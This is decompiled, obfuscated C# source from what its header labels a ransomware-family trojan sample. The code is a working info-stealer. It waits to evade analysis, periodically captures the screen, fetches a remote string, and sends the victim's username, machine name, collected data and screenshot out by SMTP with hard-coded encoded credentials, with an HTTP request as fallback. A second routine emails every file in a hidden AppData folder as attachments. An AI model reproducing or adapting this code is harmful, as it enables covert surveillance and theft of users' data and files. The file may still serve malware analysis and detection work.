// Decompiled with JetBrains decompiler
// Type: .
// Assembly: msn, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: C3204E8B-C6C9-4864-AB4A-50B3E5132C84
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-57375c6c5fdf5cb633258ada4e91cf8f7605a4cb97903a0ea974e04b7dacd954.exe

using \u0006;
using \u000E;
using \u000E\u0006;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  internal class \u0013\u001C
  {
    public static string \u0001;
    public static string \u0002;
    public static string \u0003;
    public static string \u0004;
    public static string \u0005;
    public static string \u0006;
    public static string \u0007;
    public static string \u0008;
    public static string \u000E;
    public static string \u000F;
    public static string \u0010;
    public static string \u0011;
    public static string \u0012 = \u0008.\u0007(235);
    public static string \u0013 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(236), \u0008.\u0007(285));
    public static string \u0014 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(294), \u0008.\u0007(285));
    public static string \u0015 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(323), \u0008.\u0007(285));
    public static int \u0016 = 587;
    public static string \u0017 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(352), \u0008.\u0007(285));
    public static string \u0018 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(365), \u0008.\u0007(285));
    public static string \u0019 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(382), \u0008.\u0007(285));
    public static string \u001A = \u0016\u001C.\u0014\u001C(\u0008.\u0007(391), \u0008.\u0007(285));
    public static string \u001B = \u0016\u001C.\u0014\u001C(\u0008.\u0007(424), \u0008.\u0007(285));
    public static string \u001C = \u0016\u001C.\u0014\u001C(\u0008.\u0007(505), \u0008.\u0007(285));
    public static string \u001D = \u0016\u001C.\u0014\u001C(\u0008.\u0007(518), \u0008.\u0007(285));
    public static int \u001E = 1800000;
    public static string \u001F = \u0008.\u0007(235);
    public static string \u007F = \u0008.\u0007(235);
    public static int \u0080 = 0;
    public static \u0019\u001C \u0081;
    public static Thread \u0082 = new Thread(new ThreadStart(\u0013\u001C.\u0011\u001C));
    public static Thread \u0083 = new Thread(new ThreadStart(\u0013\u001C.\u0012\u001C));
    public static Thread \u0084 = new Thread(new ThreadStart(\u008D\u001A.\u000E\u0005.\u0004\u0005));

    [STAThread]
    public static void \u0002()
    {
      int num1;
      try
      {
        Process currentProcess = Process.GetCurrentProcess();
        IntPtr num2;
        ref IntPtr local = ref num2;
        if (true)
          local = new IntPtr(5);
        IntPtr num3 = num2;
        currentProcess.MinWorkingSet = num3;
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        Thread.Sleep(60000);
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(531), \u0008.\u0007(285))))
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(531), \u0008.\u0007(285)));
        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(572), \u0008.\u0007(285))))
          Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(572), \u0008.\u0007(285)));
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        try
        {
          foreach (string file in \u0016\u0002.\u0013\u0002().FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(572), \u0008.\u0007(285)), Microsoft.VisualBasic.FileIO.SearchOption.SearchAllSubDirectories, \u0008.\u0007(617)))
            System.IO.File.Delete(file);
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
        try
        {
          foreach (string file in \u0016\u0002.\u0013\u0002().FileSystem.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(626), \u0008.\u0007(285))))
            System.IO.File.Delete(file);
        }
        finally
        {
          IEnumerator<string> enumerator;
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0013\u001C.\u0084.IsBackground = true;
        \u0013\u001C.\u0084.Start();
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      int num4 = 0;
      int num5;
      while (true)
      {
        num5 = 1;
        try
        {
          if (num4 == 3)
            Application.Restart();
          \u0013\u001C.\u0081 = new \u0019\u001C(\u0013\u001C.\u007F);
          \u0019\u001C.\u0018\u001C();
          break;
        }
        catch (Exception ex)
        {
          int lErl = num5;
          ProjectData.SetProjectError(ex, lErl);
          checked { ++num4; }
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        \u0013\u001C.\u0082.IsBackground = true;
        \u0013\u001C.\u0082.Start();
      }
      catch (Exception ex)
      {
        int lErl = num5;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u008A\u001A.\u000E\u0004.\u0008\u0004();
      }
      catch (Exception ex)
      {
        int lErl = num5;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0013\u001C.\u0083.IsBackground = true;
        \u0013\u001C.\u0083.Start();
      }
      catch (Exception ex)
      {
        int lErl = num5;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      Process.GetCurrentProcess().WaitForExit();
    }

    public static void \u0010\u001C([In] ref double obj0)
    {
      try
      {
        DateTime t2 = DateAndTime.Now.AddSeconds(obj0);
        while (DateTime.Compare(DateAndTime.Now, t2) < 0)
          Application.DoEvents();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u0011\u001C()
    {
      \u0008.\u0007(235);
      while (true)
      {
        Thread.Sleep(\u0013\u001C.\u001E);
        string str1 = \u0008.\u0007(235);
        \u0008.\u0007(235);
        double num1 = 0.2;
        \u0013\u001C.\u0010\u001C(ref num1);
        string str2;
        try
        {
          WebClient webClient = new WebClient();
          str2 = \u0016\u001C.\u0014\u001C(\u0008.\u0007(667), \u0008.\u0007(285)) + Environment.NewLine + Environment.NewLine + webClient.DownloadString(\u0016\u001C.\u0014\u001C(\u0008.\u0007(788), \u0008.\u0007(285))) + Environment.NewLine + Environment.NewLine + \u0016\u001C.\u0014\u001C(\u0008.\u0007(877), \u0008.\u0007(285));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          str2 = \u0008.\u0007(235);
          ProjectData.ClearProjectError();
        }
        double num2 = 1.0;
        \u0013\u001C.\u0010\u001C(ref num2);
        try
        {
          if (Operators.CompareString(\u0013\u001C.\u001C, \u0016\u001C.\u0014\u001C(\u0008.\u0007(998), \u0008.\u0007(285)), false) == 0)
          {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics.FromImage((Image) bitmap).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1011), \u0008.\u0007(285)) + \u0013\u001C.\u0080.ToString() + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1068), \u0008.\u0007(285)));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        double num3 = 0.3;
        \u0013\u001C.\u0010\u001C(ref num3);
        try
        {
          if (Operators.CompareString(\u0013\u001C.\u007F, \u0008.\u0007(235), false) != 0)
          {
            \u0013\u001C.\u001F = \u0013\u001C.\u007F + Environment.NewLine + Environment.NewLine + str2 + Environment.NewLine + Environment.NewLine + str1;
            try
            {
              MailMessage message = new MailMessage();
              MailMessage mailMessage = message;
              mailMessage.From = new MailAddress(\u0013\u001C.\u0013);
              mailMessage.To.Add(\u0013\u001C.\u0013);
              mailMessage.Subject = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1081), \u0008.\u0007(285)) + Environment.UserName.ToString() + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1122), \u0008.\u0007(285)) + Environment.MachineName.ToString();
              mailMessage.Body = \u0013\u001C.\u001F;
              try
              {
                if (Operators.CompareString(\u0013\u001C.\u001C, \u0016\u001C.\u0014\u001C(\u0008.\u0007(998), \u0008.\u0007(285)), false) == 0)
                {
                  Attachment attachment = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1011), \u0008.\u0007(285)) + \u0013\u001C.\u0080.ToString() + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1068), \u0008.\u0007(285)));
                  mailMessage.Attachments.Add(attachment);
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              new SmtpClient(\u0013\u001C.\u0015)
              {
                Port = \u0013\u001C.\u0016,
                EnableSsl = true,
                Credentials = ((ICredentialsByHost) new NetworkCredential(\u0013\u001C.\u0013, \u0013\u001C.\u0014))
              }.Send(message);
            }
            catch (Exception ex1)
            {
              ProjectData.SetProjectError(ex1);
              try
              {
                HttpWebResponse response = (HttpWebResponse) WebRequest.Create(\u0016\u001C.\u0014\u001C(\u0008.\u0007(1131), \u0008.\u0007(285)) + \u0008.\u0007(1224) + \u0013\u001C.\u0013 + \u0008.\u0007(1233) + Strings.Replace(\u0016\u001C.\u0014\u001C(\u0008.\u0007(1081), \u0008.\u0007(285)) + Environment.UserName.ToString() + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1122), \u0008.\u0007(285)) + Environment.MachineName.ToString(), \u0008.\u0007(1246), \u0008.\u0007(1251)) + \u0008.\u0007(1256) + Strings.Replace(\u0013\u001C.\u001F, \u0008.\u0007(1246), \u0008.\u0007(1251)) + \u0008.\u0007(1269) + \u0013\u001C.\u0013).GetResponse();
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        \u0013\u001C.\u001F = \u0008.\u0007(235);
        \u0013\u001C.\u007F = \u0008.\u0007(235);
        \u0013\u001C.\u0012 = \u0008.\u0007(235);
        checked { ++\u0013\u001C.\u0080; }
      }
    }

    public static void \u0012\u001C()
    {
      int length = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(531), \u0016\u001C.\u0014\u001C(\u0008.\u0007(1278), \u0008.\u0007(285)))).Length;
      FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0016\u001C.\u0014\u001C(\u0008.\u0007(531), \u0016\u001C.\u0014\u001C(\u0008.\u0007(1278), \u0008.\u0007(285)))).GetFiles();
      try
      {
        double num = 25.0;
        \u0013\u001C.\u0010\u001C(ref num);
        string Expression = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1291), \u0008.\u0007(285)) + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0001 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0002 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0003 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0004 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0005 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0006 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0007 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0008 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u000E + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u000F + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0010 + Environment.NewLine + Environment.NewLine + \u0013\u001C.\u0011 + Environment.NewLine + Environment.NewLine + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1429), \u0008.\u0007(285));
        try
        {
          MailMessage message = new MailMessage();
          MailMessage mailMessage = message;
          mailMessage.From = new MailAddress(\u0013\u001C.\u0013);
          mailMessage.To.Add(\u0013\u001C.\u0013);
          mailMessage.Subject = \u0016\u001C.\u0014\u001C(\u0008.\u0007(1663), \u0008.\u0007(285)) + Environment.UserName.ToString() + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1122), \u0016\u001C.\u0014\u001C(\u0008.\u0007(1278), \u0008.\u0007(285))) + Environment.MachineName.ToString();
          mailMessage.Body = Expression;
          try
          {
            FileInfo[] fileInfoArray = files;
            int index = 0;
            while (index < fileInfoArray.Length)
            {
              Attachment attachment = new Attachment(fileInfoArray[index].FullName);
              mailMessage.Attachments.Add(attachment);
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          new SmtpClient(\u0013\u001C.\u0015)
          {
            Port = \u0013\u001C.\u0016,
            EnableSsl = true,
            Credentials = ((ICredentialsByHost) new NetworkCredential(\u0013\u001C.\u0013, \u0013\u001C.\u0014))
          }.Send(message);
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          try
          {
            HttpWebResponse response = (HttpWebResponse) WebRequest.Create(\u0016\u001C.\u0014\u001C(\u0008.\u0007(1131), \u0008.\u0007(285)) + \u0008.\u0007(1224) + \u0013\u001C.\u0013 + \u0008.\u0007(1233) + Strings.Replace(\u0016\u001C.\u0014\u001C(\u0008.\u0007(1663), \u0008.\u0007(285)) + Environment.UserName.ToString() + \u0016\u001C.\u0014\u001C(\u0008.\u0007(1122), \u0016\u001C.\u0014\u001C(\u0008.\u0007(1278), \u0008.\u0007(285))) + Environment.MachineName.ToString(), \u0008.\u0007(1246), \u0008.\u0007(1251)) + \u0008.\u0007(1256) + Strings.Replace(Expression, \u0008.\u0007(1246), \u0008.\u0007(1251)) + \u0008.\u0007(1269) + \u0013\u001C.\u0013).GetResponse();
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
          }
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
